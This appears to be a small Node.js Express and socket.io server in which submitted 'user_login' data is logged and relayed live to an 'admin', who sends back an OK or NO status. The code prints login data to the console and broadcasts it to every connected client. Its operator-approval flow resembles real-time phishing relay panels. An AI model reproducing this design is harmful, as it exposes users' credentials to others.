const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(__dirname));

io.on('connection', (socket) => {
    // User jab data bhejta hai
    socket.on('user_login', (data) => {
        console.log("Data Received:", data);
        // Admin ko data bhejo
        io.emit('admin_receive_data', { id: socket.id, ...data });
    });

    // Admin jab OK ya NO click karta hai
    socket.on('admin_decision', (data) => {
        // Sirf us specific user ko result bhejo
        io.to(data.userId).emit('final_status', { status: data.status });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
